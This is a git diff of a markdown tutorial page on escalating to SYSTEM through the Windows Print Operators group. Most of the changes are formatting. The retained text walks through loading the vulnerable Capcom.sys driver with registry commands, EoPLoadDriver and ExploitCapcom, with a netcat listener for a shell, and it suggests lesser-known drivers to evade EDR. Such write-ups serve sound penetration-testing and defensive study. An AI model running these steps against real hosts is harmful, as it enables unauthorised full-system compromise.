@@ -1,16 +1,17 @@
 ---
 title: Print Operators
 date: 2026-06-26 23:15:24
+
 categories:
   - Active Directory
   - Windows
   - Post-Exploitation
   - Windows Privesc
   - Groups
+
 tags:
-  - Privilege-Escalation
   - Windows
-  - SYSTEM
+  - Privilege-Escalation
   - SeLoadDriverPrivilege
   - Print-Operators
   - BYOVD
@@ -23,11 +24,18 @@ tags:
   - Kernel
   - Kernel-Driver
   - NTLoadDriver
+  - SYSTEM
   - UAC
   - Driver-Hijacking
+
+cover: /img/seloaddriverprivilege.png
+top_img: /img/bg-img.jpg
+description: Abuse SeLoadDriverPrivilege to load a vulnerable kernel driver, execute arbitrary code in kernel mode, and obtain SYSTEM privileges using manual or automated BYOVD techniques.
 ---
 
 > Print Operators is a Windows privileged group whose members can manage printers and printer drivers on Domain Controllers. This group grants the `SeLoadDriverPrivilege`, which allows loading kernel drivers. Because kernel drivers run with SYSTEM privileges, this role can be abused to load a vulnerable driver and execute code with full system privileges.
+
+
 
 ## Manual Exploitation
 
@@ -73,11 +81,12 @@ SeUndockPrivilege             ...                            Disabled
 
 > `SeLoadDriverPrivilege` does not appear at all until we elevate. If we do not see it, we need to elevate first before continuing.
 
+
 ### Load the Vulnerable Driver
 
 #### Add a reference to the vulnerable driver
 
-> Download [Capcom.sys](<https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys>) and add a reference to it under the `HKEY_CURRENT_USER` registry hive:
+> Download [Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys) and add a reference to it under the `HKEY_CURRENT_USER` registry hive:
 
 ```cmd
 C:\> reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
@@ -88,7 +97,7 @@ C:\> reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
 
 #### Enable `SeLoadDriverPrivilege`
 
-> Download the [EnableSeLoadDriverPrivilege PoC](<https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp>) and add the following includes at the top of the file:
+> Download the [EnableSeLoadDriverPrivilege PoC](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp) and add the following includes at the top of the file:
 
 ```c
 #include <windows.h>
@@ -125,9 +134,10 @@ Driver Name  : Capcom.sys
 Filename     : C:\Tools\Capcom.sys
 ```
 
+
 ### Escalate privileges (with GUI access)
 
-> Compile [ExploitCapcom](<https://github.com/tandasat/ExploitCapcom>) with Visual Studio, then run it:
+> Compile [ExploitCapcom](https://github.com/tandasat/ExploitCapcom) with Visual Studio, then run it:
 
 ```powershell
 PS C:\> .\ExploitCapcom.exe
@@ -136,6 +146,7 @@ PS C:\> .\ExploitCapcom.exe
 > A `cmd.exe` shell opens with SYSTEM privileges.
 
 ![NTLM Relay SMB to SMB](/img/cmd.png)
+
 
 ### Escalate privileges (without GUI access)
 
@@ -167,7 +178,7 @@ nc -lvnp <port>
 
 ### EoPLoadDriver
 
-> We can use [EoPLoadDriver](<https://github.com/TarlogicSecurity/EoPLoadDriver/>) to automate the process of enabling the privilege, creating the registry key, and calling `NTLoadDriver` to load the driver — replacing the manual steps above.
+> We can use [EoPLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver/) to automate the process of enabling the privilege, creating the registry key, and calling `NTLoadDriver` to load the driver — replacing the manual steps above.
 
 ```cmd
 C:\> EoPLoadDriver.exe System\CurrentControlSet\Capcom C:\Tools\Capcom.sys
@@ -175,18 +186,18 @@ C:\> EoPLoadDriver.exe System\CurrentControlSet\Capcom C:\Tools\Capcom.sys
 
 > Once the driver is loaded, run ExploitCapcom as in the manual path.
 
->   * With GUI access:
->
+> - With GUI access:
 
 ```powershell
 PS C:\> .\ExploitCapcom.exe
 ```
 
->   * Without GUI access (modify line 292 first as described above):
->
+> - Without GUI access (modify line 292 first as described above):
 
 ```powershell
 PS C:\> .\ExploitCapcom.exe
 ```
 
-> Detection note: `Capcom.sys` is a well-known vulnerable driver from 2016 and is in virtually every AV/EDR signature database ➜ it will be flagged immediately on a live target. In a real engagement, a less-known BYOVD (Bring Your Own Vulnerable Driver) target would be needed.
+
+
+> Detection note: `Capcom.sys` is a well-known vulnerable driver from 2016 and is in virtually every AV/EDR signature database ➜  it will be flagged immediately on a live target. In a real engagement, a less-known BYOVD (Bring Your Own Vulnerable Driver) target would be needed.
